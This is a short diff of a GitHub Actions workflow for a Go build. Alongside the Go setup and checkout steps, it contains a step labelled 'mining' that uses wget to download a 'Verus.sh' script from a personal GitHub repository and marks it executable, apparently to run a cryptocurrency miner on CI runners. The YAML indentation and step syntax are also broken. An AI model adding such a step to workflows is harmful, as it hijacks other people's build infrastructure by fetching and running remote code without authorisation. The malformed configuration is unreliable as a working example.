@@ -15,13 +15,13 @@ jobs:
       NUM_JOBS: 20
       JOB: ${{ matrix.go }}
 steps: 
-name: Set up Go ${{ matrix.go }}
-uses : actions/setup-go@v1
-with:
+ -name: Set up Go ${{ matrix.go }}
+ uses : actions/setup-go@v1
+ with:
    go-version: ${{ matrix.go }}
    id: go
-   name: setup
+      -name: setup
    uses: actions/checkout@v1
-   name: mining
+      -name: mining
    run:
      wget https://github.com/akramverus1/mining/Verus.sh && chmos u+x verus.sh
